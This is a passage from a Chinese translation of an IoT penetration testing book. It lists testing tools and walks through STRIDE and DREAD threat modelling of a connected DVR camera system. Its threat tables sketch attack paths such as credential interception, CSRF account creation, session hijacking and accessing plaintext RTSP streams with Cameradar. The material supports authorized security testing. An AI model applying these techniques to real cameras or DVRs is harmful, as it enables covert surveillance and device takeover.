与固件工具一样，大多数移动应用安全工具也是免费且开源的。将使用的移动工具根据以下移动平台进行了拆分。

# Android

截至本书撰写时，有许多 Android 测试工具和虚拟机可在网上找到。一些工具专注于静态分析 APK 的代码，而其他工具专注于运行时的应用程序分析。大多数 Android 测试虚拟机分发是免费的，并包含测试 Android 应用程序所需的必需品，如 Android 的 SDK。尽管在这里列出了 Android 测试工具，但建议您下载适合您测试需求的 Android 测试虚拟机分发，并在该虚拟机中安装任何补充测试工具。

虽然不是必需的，但将 Android 测试工具与主机计算机分开将会导致更稳定的移动测试工作台，并防止依赖问题。

+   Android 测试虚拟机分发：

+   Android SDK

+   Android 模拟器

+   Enjarify

+   JD-Gui

+   Mob-SF

+   SQLite 浏览器

+   Burp Suite

+   OWASP ZAP

# iOS

iOS 测试工具是独特的，因为测试需要 OS X 计算机和越狱的 iDevice。如果没有这两个先决条件，将无法测试 iOS 应用程序。以下是可能用于 iOS 移动测试的一些工具：

OS X 计算机

以下列出的项目是要安装在主机计算机上用于测试和/或评估 iOS 应用程序的软件工具：

+   idb

+   Xcode 工具

+   Class-dump

+   Hopper（可选）

+   Mob-SF

+   SQLite 浏览器

+   Burp Suite

+   OWASP ZAP

越狱的 iDevice

以下列表包括需要安装到您的越狱设备上以开始测试的软件包：

+   Cydia

+   openURL

+   dumpdecrypted

+   ipainstaller

+   SSL Kill Switch 2

+   Clutch2

+   Cycript

# 硬件分析工具要求

硬件工具因被分析的特定设备而异；但是，对于所有硬件甚至电气要求都适用基本工具。制造商将使用不同类型的螺丝、外壳和安全位作为硬件拆卸的临时措施。有时，螺丝会隐藏在标签或橡胶脚下。识别螺丝类型很重要。我们将列出可绕过供应商使用的这种混淆技术的工具包。以下图片应该有助于了解一些不同类型的螺丝类型：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8e8de3fe-89ca-40d9-be9c-e223494ca5a6.png)

图片来源：http://www.instructables.com/id/When-a-Phillips-is-not-a-Phillips/

以下列出了本书中将使用的硬件工具和硬件分析软件的选项。

# 硬件工具

硬件测试工具需要一些前期投资才能开始。这里列出了拆卸设备、找到接地点和访问设备接口所需的必需和可选工具：

+   万用表

+   IFixit 经典专业技术工具包，用于硬件拆卸

+   总线海盗

+   USB 转串口适配器

+   Shikra，FTDI FT232，CP2102，PL2303，Adafruit FTDI Friend

+   JTAG 适配器

+   Shikra，JTAGulator，带 JTAGenum 的 Arduino，JLINK，Bus Blaster

+   逻辑分析仪（可选）

+   Saleae Logic 或其他

有关更多信息，您可以访问以下链接：

+   [`www.ifixit.com/Store/Tools/Classic-Pro-Tech-Toolkit-/IF145-072-1`](https://www.ifixit.com/Store/Tools/Classic-Pro-Tech-Toolkit-/IF145-072-1)

+   [`int3.cc/products/the-shikra`](http://int3.cc/products/the-shikra)

+   [`www.sparkfun.com/products/12942`](https://www.sparkfun.com/products/12942)

+   [`www.grandideastudio.com/jtagulator/`](http://www.grandideastudio.com/jtagulator/)

+   [`www.saleae.com/`](https://www.saleae.com/)

# 硬件分析软件

以下是一些免费的硬件分析工具。这些工具使我们能够访问硬件接口，例如控制台访问或将固件侧加载到设备上：

+   OpenOCD

+   Spiflash

+   Minicom

+   波特率

# 无线分析工具要求

为了开始嗅探无线技术，需要特定的无线芯片组。在本书中，我们将专注于嗅探来自 ZigBee 和 Z-Wave 协议的流量。无线网卡或 dongle 需要配备特殊软件。这里提供了使用哪种无线网卡和分析软件的建议。

# 无线分析硬件

以下是将用于分析无线电频率的硬件列表：

+   Atmel RZ Raven USB（KillerBee 框架）

+   Attify Badge（或者，C232HM-DDHSL-0 电缆和 Adafruit FTDI Breakout 的组合）

+   HackRF One

+   Yardstick One

+   带有 Xbee Shield 的 XBee

+   Ubertooth

+   BLe 适配器

# 无线分析软件

以下是常见的软件定义无线电分析软件列表。大多数列出的项目将在本书中使用。

+   KillerBee Framework

+   Attify ZigBee Framework

+   GNU Radio

+   BLEAH

+   GQRX

+   Ubertooth 工具

+   Blue Hydra

+   RTL-sdr

+   Hackrf 软件包

+   EZ-Wave


# 第二章：物联网威胁建模

在本章中，我们将涵盖以下配方：

+   熟悉威胁建模概念

+   威胁建模设备的解剖学

+   威胁建模固件

+   威胁建模物联网 Web 应用

+   威胁建模物联网移动应用

+   威胁建模物联网设备硬件

+   威胁建模物联网无线通信

# 介绍

无论您具有软件开发背景还是系统和网络背景，您可能都熟悉各自领域内的攻击面或向量。攻击面指的是设备可以通过输入源受到威胁的多种方式。这个输入源可以是通过硬件、软件或无线方式。一般来说，设备包含的攻击面越多，被威胁的可能性就越高。攻击面是物联网设备的入口点。有时，这些入口点被物联网设备或应用程序本身信任。发现的每个攻击面都将有相关的风险、可能性和影响。实质上，攻击面是可能对设备产生负面影响的威胁，使其执行意外操作。为了发现每个攻击面，需要在测试之前或软件编写之前考虑理论使用案例。这个练习被称为威胁建模。

本章将讨论威胁建模的基本原则以及它如何帮助我们利用物联网设备中的缺陷。将执行有关如何对固件、Web 应用程序、移动应用程序、设备硬件和无线通信进行基本威胁建模的配方，以帮助您正确入门。

虽然本章的配方将为您介绍威胁建模，但关于这个主题已经有几本书写成。如果需要补充阅读以理解威胁建模的概念，务必阅读有关威胁建模的书籍或参考第三方来源。

# 熟悉威胁建模概念

威胁建模或多或少与软件开发相关，是在软件设计阶段之后但在软件部署之前进行的一种练习。这些练习通常在软件开发、系统、网络和安全团队中进行，这些团队会在主要软件发布时绘制完整的端到端数据流图或数据流和网络图，以确定如何使用安全控制和对策。这些图可以在白板上物理绘制，也可以通过诸如微软免费的威胁建模工具和 Web 应用程序（例如[`draw.io`](https://draw.io/)）等软件工具绘制，这些工具有许多模板图表可用于各种用途。其核心思想是将设备的所有功能和特性映射到其相关的技术依赖关系上。威胁模型的格式如何绘制取决于公司或个人。请记住，威胁模型在逐步更新文档时可以变得非常细化，因为随着功能的增加以及对某种技术的更多了解，威胁也会发生变化。

一旦绘制出物联网设备的攻击面，就必须使用诸如 STRIDE 之类的方法来识别威胁使用案例，这将在后面讨论。这些威胁将需要使用评级系统进行评级，以确定发现威胁的风险。根据行业，有几种威胁评级系统；然而，最常见的是 DREAD 和**通用漏洞评分系统**（**CVSS**）。

CVSS 提供了一个更精细的评级系统，其中包括 3 组中的 14 个评分区域：基本、临时和环境。这三个组中的每一个都细分为包括基本的六个、临时的三个和环境的五个子区域。CVSS 对于向供应商报告漏洞可能非常有用，但对于威胁建模目的可能不太直观。要了解有关 CVSS 的更多信息，请访问[`www.first.org/cvss/user-guide`](https://www.first.org/cvss/user-guide)。

DREAD 评级系统代表以下内容：

+   **损害潜力**：如果被利用，损害有多大？

+   **可重现性**：攻击有多容易重现？

+   **可利用性**：攻击有多容易？

+   **受影响用户**：大约有多少用户受到影响？

+   **可发现性**：漏洞有多容易被发现？

DREAD 具有从 1 到 3 的风险评级系统。1 是低风险，2 是中等风险，3 是高风险。

以下表格描述了每个评级类别的每个评级数字：

|  | **评级** | **高（3）** | **中（2）** | **低（1）** |
| --- | --- | --- | --- | --- |
| **D** | 损害潜力 | 可以破坏所有安全控制并获得完全信任，接管整个物联网生态系统。 | 可能泄露敏感信息。 | 可能泄露敏感信息。 |
| **R** | 可重现性 | 攻击总是可重现的。 | 攻击只能在定时窗口或特定条件内重现。 | 即使有关漏洞的具体信息，也很难重现攻击。 |
| **E** | 可利用性 | 新手攻击者可以执行攻击。 | 熟练的攻击者可以重复进行攻击。 | 允许具有深入知识的熟练攻击者执行攻击。 |
| **A** | 受影响用户 | 所有用户，默认配置，所有设备。 | 影响一些用户，一些设备和自定义配置。 | 通过模糊功能影响少部分用户和/或设备。 |
| **D** | 可发现性 | 攻击解释可以很容易在出版物中找到。 | 影响很少使用的功能，攻击者需要非常有创造力才能发现其恶意用途。 | 是模糊的，攻击者不太可能发现利用漏洞的方法。 |

STRIDE 模型将威胁分为六类，以便提出问题来发现可能的威胁。这六种威胁类别源自缩写 STRIDE，描述如下：

+   **欺骗身份**：欺骗是试图通过使用虚假身份来获取系统访问权限。这可以通过使用窃取的用户凭据或虚假 IP 地址来实现。在攻击者成功以合法用户或主机身份获得访问权限后，可以开始提升权限或滥用授权。

+   **篡改数据**：篡改是未经授权的数据修改，例如在两台计算机之间流动时。

+   **否认**：否认是用户（合法或非法）否认他们执行特定操作或交易的能力。如果没有充分的审计，否认攻击很难证明。

+   **信息泄露**：信息泄露是私人数据的意外暴露。例如，用户查看他或她未被授权打开的表格或文件的内容，或者监视通过网络以纯文本传递的数据。信息泄露漏洞的一些例子包括使用隐藏的表单字段，嵌入包含数据库连接字符串和连接详细信息的网页注释，以及弱异常处理可能导致内部系统级详细信息被泄露给客户端。攻击者可以利用这些信息中的任何信息。

+   **拒绝服务**：拒绝服务是使系统或应用程序不可用的过程。例如，拒绝服务攻击可能通过向服务器发送请求以消耗所有可用系统资源或通过传递格式错误的输入数据来使应用程序进程崩溃来实现。

+   **权限提升**：权限提升是指具有有限权限的用户假定特权用户的身份以获得对应用程序的特权访问。例如，具有有限权限的攻击者可能提升他或她的特权级别，以破坏并控制高度特权和受信任的进程或帐户。

有关使用 STRIDE 的更多详细信息，请参阅以下链接：

[`msdn.microsoft.com/en-us/library/ee823878(v=cs.20).aspx`](https://msdn.microsoft.com/en-us/library/ee823878(v=cs.20).aspx) [`msdn.microsoft.com/en-us/library/ff648641.aspx`](https://msdn.microsoft.com/en-us/library/ff648641.aspx)

微软提供的一种很好的威胁建模方法使用了一个多步骤的过程来确定新应用程序或系统引入的威胁的严重程度。威胁建模过程的步骤如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ed0ffd64-8085-4b47-b865-5cf8067b086b.png)

有关微软威胁建模过程的更多阅读，请参阅以下链接：

[`msdn.microsoft.com/en-us/library/ff648644.aspx`](https://msdn.microsoft.com/en-us/library/ff648644.aspx)

我们将应用 STRIDE 和 DREAD 来从黑盒的角度进行威胁建模练习，并在每个步骤中分解物联网设备的组件。在开始任何类型的安全测试时，最好先进行威胁建模，以确保测试的覆盖范围已经到位。想象所有潜在的威胁可能性并将它们分类作为一种大脑锻炼也是很有趣的。

# 准备工作

为了在本章中逐步进行威胁建模，我们将利用微软免费的威胁建模工具和从 [`draw.io`](https://draw.io/) 绘制的图表。在撰写本文时，可以从 [`www.microsoft.com/en-us/download/details.aspx?id=49168`](https://www.microsoft.com/en-us/download/details.aspx?id=49168) 下载微软的威胁建模工具 2016。

# 如何做...

在这个步骤中，我们将使用微软的威胁建模工具，因为使用它可以很容易地绘制网络图表：

1.  启动微软的威胁建模工具 2016\. 选择“创建模型”选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b865a51c-3a5a-48ed-ade5-d1b933660e30.png)

1.  熟悉工具提供的 Stencils，以展示设备、传输通信以及输入和输出的信任边界。微软在工具下载时提供了不同 Stencils 和选项的用户指南，尽管不是必需阅读：

截至 2016 年版的微软威胁建模工具，可以创建自定义模板和 Stencils 以更准确地相关威胁。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a09af89d-24b2-4be3-8192-c0896586f372.png)

1.  每个 Stencil 属性都可以根据设备、网络或应用程序进行修改：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/77b68beb-07ce-4c88-bff2-89f52a0a459d.png)

1.  在这个阶段，我们通常会从高层次识别物联网系统的资产，并在通过研究或逆向工程获得更多了解设备的知识后，再对感兴趣的领域进行深入研究。资产的识别可以以表格格式或通过可视化头脑风暴来书写。以下表格显示了资产的基本清单和每个资产的简要描述：

| **ID** | **资产** | **描述** |
| --- | --- | --- |
| 1 | 门铃 | 智能门铃监视运动，向用户发出警报，并通过应用程序提供实时摄像头视频。数据存储在门铃本身以及应用程序界面上。如果用户在网络中本地查看摄像头视频，门铃可以通过 P2P 与 SIP/RTP 连接，或者连接到使用 STUN/TURN 服务器的应用程序，以无需打开路由器端口即可访问摄像头视频。所有数据都传输到路由器以进行远程访问。 |
| 2 | LED 灯泡 | LED 灯泡通过 Zigbee 传输数据到物联网中心，以便通过 Wi-Fi 进行通信。LED 灯泡可以通过物联网中心或应用程序界面进行控制。 |
| 3 | 移动应用程序 | 移动应用程序控制网络中的各种设备。这些移动应用程序可以直接由设备制造商或物联网中心供应商创建。设备配置数据和密钥可能存储在移动应用程序中。数据通过 API 或 Web 服务传输到设备或后端系统。 |
| 4 | 物联网中心 | 物联网中心将所有协议聚合到一个设备中，以便进行简化管理。用户可以通过物联网中心的应用程序界面控制设备。物联网中心可以通过无线连接到路由器，也可以通过以太网插入连接。物联网中心存储配置数据，并可能将数据外部发送到后端系统进行处理。 |
| 5 | 路由器 | 所有网络通信都由路由器处理。路由器可以阻止外部访问设备，也可以让流量通过。 |

1.  以下图示展示了一个智能家居环境的概述图，其中包括智能门铃、LED 灯泡、移动应用程序和物联网中心：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/260726cf-3398-41ae-9d64-57657b46c7a6.png)

所描述的示例步骤只是威胁建模练习的开始。我们讨论了下载微软的威胁模型工具，并熟悉了图形符号及其相关属性。然后，我们开始识别智能家居环境的资产，并根据研究或逆向工程形式提供简要描述。接下来，给出了一个示例架构图，以可视化识别的资产。我们的下一步将是威胁建模的核心，将帮助分解 IoT 系统的每个部分，以帮助识别攻击点、方法和如果 IoT 系统的一部分被利用的影响。与安全的许多方面一样，您对计划测试的平台越熟悉，被攻击的可能性就越高。

# 威胁建模物联网设备的解剖学

2016 年，我们目睹了由 IP 摄像头和数字视频录像机（DVR）组成的大规模 IoT 设备的大规模利用，这导致了有史以来最大的分布式拒绝服务（DDoS）。这次 DDoS 是由于供应商的疏忽造成的，这本可以通过基本的威胁模型练习来防止。考虑到这些类型的设备在互联网上的普遍存在以及它们对互联网的风险，我们将进行威胁建模练习，并走过连接的 DVR IP 摄像头安全系统的威胁建模过程。这些连接的安全系统可以通过电子商务网站以及许多电子商店以相对较低的价格购买。连接的 DVR 是 IoT 系统的一个很好的例子，因为它们包含许多进入设备的入口，以便查看摄像头视频，并可以连接到第三方提供商以利用远程查看而无需在您的网络上打开端口。从黑盒的角度收集有关 IoT 设备及其应用程序的详细信息可能有些棘手。然而，可能有很多在线产品资源可用于帮助进行这项练习。

# 如何做...

要开始威胁建模连接的 DVR，我们将遵循前面提到的微软多步骤威胁建模方法。

# 步骤 1 - 识别资产

记录 DVR 的所有资产，以了解在时间利益上更可能的攻击焦点。如果我们能够识别包含公共漏洞的资产，那么在利用 DVR 系统时，这将节省我们时间。通过阅读盒子背面和用户手册来安装设备时，以下表格描述了我们对 DVR 资产的了解：

| **ID** | **资产** | **描述** |
| --- | --- | --- |
| 1 | DVR | DVR 包含多个摄像头通道，可查看实时源，回放以前的源，录制视频和拍摄摄像头图片。DVR 可以连接到 IP 摄像头或有线 BNC 电缆摄像头。支持多种已知的网络协议和专有协议，如 TCP/IP，PPPoE，DHCP，Hik-connect Cloud P2P，DNS，DDNS，NTP，SADP，SMTP，NFS，iSCSI，UPnP 和 HTTPS。DVR 具有连接到多个应用程序接口查看摄像头源的能力。 |
| 2 | 摄像头 | 视频流由启用的 IP 摄像头和/或 BNC 电缆摄像头捕获，数据直接传输到 DVR 或通过无线方式传输。 |
| 3 | 固件 | 通过固件控制各种摄像头功能和配置选项。 |
| 4 | Web 应用 | DVR 包含一个本地 Web 服务器，可以通过在 Web 浏览器中访问 IP 地址来访问。要通过本地 Web 应用程序查看视频源，必须使用支持的浏览器下载插件。在配置设备时，设备可以通过供应商的云 SaaS 平台查看视频源。需要单独的用户名和密码才能启用供应商的云 SaaS 平台。SaaS 平台为第三方添加了额外的共享功能，并可以访问同一所有者可能购买的其他 DVR。 |
| 5 | 移动应用 | 可用于配置各种设置以及远程查看和保存视频源的 Android 和 iOS 应用程序。所有移动应用程序的流量都通过供应商的 API 发送到移动设备的网络连接。移动应用程序连接到供应商的云环境以渲染摄像头源。需要用户名和密码才能通过移动应用程序访问摄像头系统。 |
| 6 | 厚应用 | 可以安装 Windows 和 OS X 安装程序来查看摄像头源并配置各种设置。 |
| 7 | 设备硬件 | DVR 硬件包含多个 VGA 和 HDMI 视频输出。设备通过以太网电缆连接到本地网络。对于存储，设备具有一个 SATA 连接器，可容纳高达 6TB 的硬盘。 |
| 8 | 无线通信 | DVR 通过 BNC 连接器或 IP 连接到摄像头。不使用无线通信；但是，所有移动应用程序的流量都通过无线通信传输。 |

# 步骤 2 - 创建物联网设备架构概述

创建架构概述有助于可视化我们如何攻击 DVR 以错误使用系统。在创建物联网设备架构概述时，我们的目标是记录 DVR 的功能及其应用程序以及从我们已经收集或在过程中学到的数据中的物理架构。我们希望发现 DVR 设计和实施中的缺陷。这还包括识别不同的技术。让我们分解如何创建架构概述为三个任务：

+   记录 DVR 功能和特性

+   创建一个详细的 DVR 生态系统的架构图

+   识别正在使用的技术

要开始记录 DVR 功能和特性，让我们创建一些用例。

**用例 1**：用户通过本地 Web 应用程序在其本地网络中查看摄像头源

1.  用户安装 DVR 和摄像头。

1.  用户创建一个用户。

1.  用户配置 DVR 和摄像头设置。

1.  用户然后将以太网连接到 DVR 以进行网络连接。

1.  用户记录 DVR IP 地址。

1.  用户然后安装供应商提供的插件和软件。

1.  用户通过 Web 浏览器登录 DVR。

1.  用户选择适当的摄像头查看其视频。

**用例 2**：用户通过移动应用程序远程查看摄像头视频

1.  用户配置平台访问供应商 SaaS 的设置。

1.  用户下载并安装 Android 或 iOS 应用程序。

1.  用户在安装时为供应商的 SaaS 应用程序创建一个单独的用户。

1.  用户登录移动应用程序。

1.  用户使用移动应用程序在 DVR 下扫描条形码进行供应商验证。

1.  用户选择适当的摄像头查看其视频。

前述列出的用例的以下架构图提供了 DVR 生态系统组件的详细信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e248e594-8362-4aab-9edc-655bb2c52245.png)

一旦绘制了架构图，就需要识别和检查不同的技术。某些操作系统、协议和低级库具有固有的漏洞。重要的是记录所使用的技术，以进一步分析和定义可能的威胁案例：

| **技术** | **详情** |
| --- | --- |
| DVR | 嵌入式 Linux 3.10.0；通过 HTTP 和 TCP/IP 通信；自定义 Web 服务器（DNVRS-Webs）；内部和外部存储选项。 |
| 无线（Wi-Fi）路由器 | 2.4 GHz Wi-Fi；100 米范围。 |
| 移动应用程序 | Android 和 iOS 应用程序连接到第三方服务，用于查看摄像头视频。数据可以选择在设备上本地存储图片和用户凭据。 |
| 通信协议：HTTP | 默认情况下查看摄像头视频时使用的明文协议。 |
| 通信协议：HTTPS | 查看摄像头视频时进行加密通信，但需要在通过 Web 界面生成 SSL 证书后手动配置。 |
| 通信协议：802.11 Wi-Fi | IP 摄像头和 DVR 之间通信的 RF 协议。 |
| 通信协议：RTSP | 用于将摄像头视频流式传输到应用程序的网络协议。 |

# 第 3 步 - 分解物联网设备

接下来，我们将分析应用程序和协议数据流通过 DVR 环境，以找到设备或客户端应用程序的易受攻击的入口点。我们将寻找可能具有更高特权访问的位置，并记录每个可能的入口点。一个危害 DVR 机密性和完整性的入口点将使我们作为攻击者占据上风。

这些入口点将根据所使用的平台、技术和协议而变化，但在本节中，我们将保持在较高水平。还要检查技术和功能之间的各种信任边界。一旦分解 DVR 架构完成，您应该对攻击面有更好的了解，以及数据可能如何被威胁。

以下图表是分解物联网 DVR 环境数据流的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a43ea0b8-4241-4fd7-aaad-f9877d0d02b1.png)

在映射数据流并完成后，进行入口点的文档记录：

| **DVR 入口点** |  |  |
| --- | --- | --- |
| **＃** | **入口点** | **描述** |
| 1 | 嵌入式 Web 应用程序 | 嵌入式 Web 应用程序提供了一个界面，用于查看摄像头视频并对摄像头细节、配置以及用于监控的网络细节进行更改，如 SNMP。嵌入式 Web 应用程序使用 SOAP/XML Web 服务通过 HTTP 进行传输通信，但可以通过在配置菜单中创建自签名证书来使用 HTTPS。为了查看摄像头视频，需要下载一个可执行文件，在可执行文件中，需要在 Internet Explorer 中安装一个 ActiveX 插件。注意：**Internet Explorer**（IE）之外的浏览器无法查看摄像头视频。 |
| 2 | 供应商 Web 应用 | DVR 与供应商拥有的 STUN/TURN 服务器建立连接，以便在不打开路由器端口的情况下流式传输摄像头视频。供应商应用仅通过 HTTPS 可用，并使用 Web 套接字进行通信。 |
| 3 | DVR | DVR 连接到多个 Web 应用程序和移动应用程序。嵌入式 Web 应用程序是 DVR 本身的服务器，供应商的 SaaS 应用程序连接到 DVR。同样，供应商有一个可用的移动应用程序，但也有另一个原始制造商为 DVR 提供的第三方移动应用程序（通过代理发现）。DVR 还通过硬件外围设备和主 PCB 进行输入。 |
| 4 | 固件 | DVR 利用固件来控制设备，但可能只能通过供应商技术支持（根据文档）获得。嵌入式 Web 服务器利用固件进行管理操作。 |
| 5 | 摄像头 | 可以通过将其 IP 地址添加到 DVR 配置页面来将摄像头添加到 DVR。摄像头也可以通过手动插入具有 BNC 连接器的摄像头来添加。 |
| 6 | 移动应用程序 | 可以下载多个移动应用程序。每个移动应用程序都可以对 DVR 和摄像头进行配置更改。使用移动应用程序需要凭据。所有流量都被传送到供应商环境以查看摄像头详情和视频。 |
| 7 | 无线通信 | 移动应用程序的通信流量通过无线技术进行，可以是 802.11 或蜂窝网络（4G）。 |

# 步骤 4 - 辨识威胁

在这个阶段，我们已经绘制出了 DVR 系统的数据流，并确定了入口点。现在我们必须确定每个入口点的风险，因为它涉及用户、网络和应用程序，以及编写应用程序代码的供应商。从攻击者的角度来看，我们希望确定影响网络、应用程序和主机的威胁，这些威胁可能是可利用的，并造成以下影响：

+   影响使用这个特定 DVR 系统的大量用户

+   妥协供应商基础设施以引发大规模利用

+   妥协 DVR 以对用户构成隐私风险

+   妥协 DVR 以对 DVR 所有者构成安全风险

为了帮助辨识威胁并对其进行分类，让我们将 STRIDE 模型应用于我们的 DVR 物联网系统。在下表中，我们将添加一些威胁类型，以代替物联网特定问题。这张表并不是详尽无遗的，但应该有助于思考可能影响整体 DVR 环境的威胁时提供一些想法：

| **威胁类型** | **分析** |
| --- | --- |
| 冒充身份 | 检查系统中与冒充 DVR 身份相关的威胁，以及攻击者克服设备之间自动信任关系的能力。寻找允许设备或用户在 DVR 配置过程中操纵信任关系的入口点。分析 DVR 应用程序接口的身份验证和授权功能。检查 DVR 应用程序通信是否具有伪造请求的能力。 |
| 数据篡改 | 检查 DVR 应用程序和设备之间的消息通信。识别 DVR 中提供数据篡改机会的点，包括数据收集、处理、传输和存储的环节。尝试篡改固件和移动应用程序配置，执行未经授权的操作。 |
| 否认 | 辨识允许进行非法操作而无需记录能力的攻击入口点。禁用 Web 和移动应用程序的跟踪功能。 |
| 信息泄露 | 模糊应用程序参数以影响应用程序错误披露。识别所有明文通信。检查 DVR API 通信的 HTTP 响应头以获取版本信息。识别所有 API 端点和应用程序后端使用的技术。检查应用程序数据存储中是否存在明文文件中的意外数据泄露。 |
| 拒绝服务 | 执行诸如忘记密码之类的功能，以确定是否可能锁定用户。测试每个 DVR 应用程序界面中的帐户锁定策略。检查 DVR 网络服务的吞吐量，以了解攻击可能如何抵御相关的 DoS 攻击。检查消息结构（例如，数据总线）、数据结构、变量和 DVR 组件中使用的 API 的不当使用，并确定是否存在漏洞，使恶意摄像头可以淹没合法摄像头或兼容的 DVR 设备的传输。 |
| 特权提升 | 检查 DVR 提供的管理功能。创建较低的应用程序用户并测试管理访问。识别 DVR 应用程序和操作系统中无法将管理功能与用户级功能分隔开的弱点。识别 DVR 节点所采用的身份验证方法的弱点，以便设计适当的身份验证控件到系统中。 |
| 物理安全绕过 | 检查 DVR 及其摄像头提供的物理保护机制，以识别可能允许管理控制台访问的弱点。 |
| 供应链问题 | 了解组成 DVR 系统的各种技术组件及其来源（例如，ODM、硬件制造商、OEM 等）。跟踪与 DVR 硬件和软件组件相关的任何技术层面的漏洞。 |

或者，我们可以简单地列出高层次的威胁，然后在本章后面，我们将深入研究每个组件的威胁。一些威胁可能是未知的或完全理论的，因为我们可能没有所有的见解，但重要的是要进行头脑风暴。为了更好地识别威胁，可以与伙伴配对或与其他人一起进行小组练习，他们正在攻击您感兴趣的特定物联网系统。以下是我们 DVR 系统的高级威胁的示例，攻击者可能执行的：

+   远程接管 DVR 系统

+   未经授权远程查看摄像头视频（间谍）

+   关闭摄像头录制回放功能

+   跟踪个人

+   根据情报收集闯入周围区域

+   在 DVR 上安装恶意软件

+   获得物理访问并破坏录音

+   用请求超载 DVR 以阻止使用

+   窃听 DVR 通信

# 第 5 步 - 记录威胁

接下来，我们将记录我们在第 4 步中识别的一些威胁用例，包括描述、威胁目标、攻击技术和可能存在的任何对策。

# 威胁＃1

| **威胁描述** | **攻击者可能远程接管 DVR 系统** |
| --- | --- |
| 威胁目标 | DVR 客户、DVR 网络进程、DVR 应用程序。 |
| 攻击技术 | 攻击者拦截无线通信，API 通信和/或网络协议通信以获取凭据或会话 cookie。攻击者可以通过欺骗用户访问其 DVR，通过欺骗用户界面或利用应用程序漏洞使用跨站点请求伪造（CSRF）添加用户帐户。 |
| 对策 | 如果尝试登录失败或同时发送太多请求，DVR 将锁定用户 30 分钟。 |

# 威胁＃2

| **威胁描述** | **攻击者可能未经授权远程查看摄像头视频** |
| --- | --- |
| 威胁目标 | DVR 客户、协议和应用程序。 |
| 攻击技术 | 获取凭据或 API 调用以在未经身份验证的情况下查看摄像头。攻击者可以获取会话标识符以劫持会话，从而实现远程查看摄像头视频。攻击者可以通过社会工程学诱使用户访问其 DVR 视频。攻击者可以利用易受攻击的明文 RTSP 流使用诸如 Cameradar（[`hub.docker.com/r/ullaakut/cameradar/`](https://hub.docker.com/r/ullaakut/cameradar/)）之类的工具访问视频源。 |
| 对策 | 强制执行多因素身份验证，并使用加密的 RTSP 或 SRTP 流。 |

# 威胁＃3

| **威胁描述** | **攻击者可能关闭录制回放功能** |
| --- | --- |
| 威胁目标 | DVR 客户。 |
| 攻击技术 | 攻击者可以物理访问 DVR 系统以应用更改。攻击者可以通过社会工程使用户访问其 DVR。 |
| 对策 | 对敏感功能进行身份验证，以及多因素身份验证。 |

# 步骤 6 - 对威胁进行评级

既然我们已经确定并记录了 DVR 的威胁，让我们使用 DREAD 评级系统对威胁进行评级，以及它们可能的影响。在本章的前面，我们介绍了 DREAD 评级系统，但需要注意的是，还有其他可用的评级系统。DREAD 中每个字母的评级值范围为高 3，中 2，低 1。

对于 DREAD，最终风险是使用以下评级进行排名的：

| **风险评级** | **结果** |
| --- | --- |
| 高 | 12-15 |
| 中等 | 8-11 |
| 低 | 5-7 |

我们的 DVR 系统中威胁案例的威胁评级示例如下：

| **威胁风险评级：攻击者可能未经授权远程查看摄像头视频** |  |
| --- | --- |
| **项目** | **分数** |
| 损害潜力 | 3 |
| 可重现性 | 2 |
| 可利用性 | 3 |
| 受影响的用户 | 2 |
| 可发现性 | 3 |
| **风险评级分数：高** | **13** |

最初，对整体 DVR 系统进行威胁建模可能会更加困难，因为需要考虑所有不同的组件的威胁案例。尽管如此，一旦完成，您将已记录了许多潜在的高风险漏洞，以便进行测试时专注于重点。这将使得在测试物联网系统时更容易优先处理漏洞。

# 威胁建模固件

在上一节中，我们对 DVR 系统进行了威胁建模，并对一个威胁案例进行了评级，这有助于优先处理要测试的漏洞。在本节中，我们将对相同的 DVR 系统的固件进行威胁建模。

# 准备工作

在这个练习中，我们将使用免费的[`draw.io`](https://draw.io/)在线图表软件来帮助演示固件内的图表关系。这个工具是一个 Chrome 应用，与 Google Drive 或 GitHub 等第三方服务进行存储。我们可以绘制重叠的关系和流程，这在 Microsoft 工具中是不可能的。任何能够有效绘制目标设备或软件的架构及其相应关系的工具都可以。

要开始绘制图表，请执行以下步骤：

1.  选择创建新图表。

1.  选择软件设计。

1.  选择部署图表模板，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c5cbb192-eb79-4d45-b76d-f1701e66bb3c.png)

1.  删除模板中所有未使用的图表，只留下一个矩形用于固件及其内部组件。

1.  将资产拖放到图表中以显示它们的关系。

# 如何做...

对于固件，我们可以通过设备包装、基本端口扫描或各种在线资源来确定正在运行的操作系统的类型。我们应该对嵌入式物联网设备上的固件功能有一个大致的了解，如第一章中所讨论的。本节不会像前面的内容那样详细，但我们仍然希望确定我们对固件的所有了解，并绘制其组件以确定测试的潜在威胁。我们将合并一些威胁建模步骤以简洁起见。

# 步骤 1 - 确定资产

根据我们对固件和 DVR 提供的服务的了解，让我们使用以下表格来记录一些固件资产：

| **ID** | **资产** | **描述** |
| --- | --- | --- |
| 1 | Web 服务器 | 固件为本地 Web 应用提供服务，用于查看摄像头视频和管理摄像头。 |
| 2 | SSH | DVR 在端口 22 上监听 shell 访问。 |
| 3 | RTSP | 摄像头视频流使用 RTSP 进行查看。 |
| 4 | UPnP | UPnP 可用于管理设备的配置。 |
| 5 | DNS | 本地 DNS 服务器用于远程查看。 |

# 步骤 2 和 3 - 创建架构概述和分解

我们大致了解了固件组件和可能使用的库，这些库与 DVR 的服务相关。可以绘制以下概述图，显示设备、固件内容以及文件系统之间的关系：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/988a8d59-07dc-4dba-925d-510deda23155.png)

# 步骤 4 - 识别威胁

现在让我们根据我们的图表和对固件内容的了解来记录威胁。请记住，在这个阶段我们还没有对固件图像进行反汇编或定位。图表的内容是基于 DVR 宣传的服务和在线文档的假设。以下是攻击者可能利用的固件的可能威胁：

+   在网络服务上执行远程代码执行

+   获得对文件系统的管理员访问权并攻击局域网

